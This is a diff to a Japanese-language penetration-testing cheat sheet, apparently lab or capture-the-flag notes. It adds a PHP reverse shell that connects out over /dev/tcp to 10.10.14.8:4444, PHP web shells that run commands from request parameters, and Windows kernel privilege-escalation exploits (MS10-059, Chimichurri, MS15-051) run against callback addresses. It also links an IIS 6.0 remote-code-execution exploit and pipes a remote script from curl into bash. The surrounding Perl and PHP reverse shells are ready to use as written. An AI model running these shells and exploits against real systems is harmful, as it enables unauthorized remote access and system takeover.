@@ -1024,6 +1024,14 @@ perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotob
 ### PHP
 ```
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+```
+<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
+```
+https://github.com/pentestmonkey/php-reverse-shell.git
+
+```
+# Web Shell
 <?php echo system($_REQUEST ["cmd"]); ?>
 <?php echo(system($_GET["cmd"])); ?>
 ```
@@ -1316,6 +1324,35 @@ crunch 2 3 -o dict.txt
 誕生日、ニックネーム、ペットの名前などを対話形式で答えていく。
 ```
 cupp -i
+```
+
+## python2(EOL)
+```
+# apt
+sudo apt install python2
+curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
+python2 get-pip.py
+```
+```
+ls /home/kali/.local/bin | grep pip                                                          1 ⨯
+pip
+pip2
+pip2.7
+pipx
+
+pip2 --version
+pip 20.3.4 from /home/kali/.local/lib/python2.7/site-packages/pip (python 2.7)
+```
+```
+# pyenv
+sudo apt install -y build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python3-openssl git
+curl https://pyenv.run | bash
+echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.zshrc
+echo 'export PATH="$PYENV_ROOT/versions/2.7.18/bin:$PATH"' >> ~/.zshrc
+echo -e 'if command -v pyenv 1>/dev/null 2>&1; then\n  eval "$(pyenv init -)"\nfi' >> ~/.zshrc
+exec $SHELL
+pyenv install 2.7.18
+pyenv global 2.7.18
 ```
 
 ## base64,16進数 → テキスト
@@ -2476,12 +2513,14 @@ searchsploit Microsoft Windows [build number]
 windowsでexploitを列挙するためのスクリプト
 systeminfoコマンドの出力が必要
 ```
+# ファイルの更新
 ./windows-exploit-suggester.py --update
-pip install xlrd
+# xlrdのインストール(最新バージョンだと動作しないためxlrd1.2.0を利用)
+pip2 install xlrd==1.2.0
 ```
 ```
 systeminfo > systeminfo.txt
-./windows-exploit-suggester.py -database 2020-06-08-mssb.xls -systeminfo systeminfo.txt
+./windows-exploit-suggester.py --database 2020-06-08-mssb.xls --systeminfo systeminfo.txt
 ```
 
 ### Sherlock.ps1
@@ -2809,6 +2848,9 @@ https://www.exploit-db.com/exploits/41564
 Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution:
 ・sudo gem install highline
 https://www.exploit-db.com/exploits/44449
+
+Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow:
+https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
 ```
 
 ## Privilege Escalation(Windows)
@@ -2818,9 +2860,16 @@ https://github.com/ohpe/juicy-potato.git
 Juicy-potato(x86バイナリ):  
 https://github.com/ivanitlearning/Juicy-Potato-x86.git
 
-MS15-051:
+MS10-059(Microsoft Windows Server 2008 R2 Standard 6.1.7600 N/A Build 7600):
+.\MS10-059.exe 10.10.10.1 4444
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059
+.\Chimichurri.exe 10.10.16.4 443
+https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri
+
+MS15-051(Microsoft Windows Server 2008 R2 Datacenter 6.1.7600 N/A Build 7600):
+.\ms15-51.exe whoami
 https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
 
-MS16-098:
+MS16-098(Microsoft Windows Server 2012 R2 Standard 6.3.9600 N/A Build 9600):
 https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098
 ```
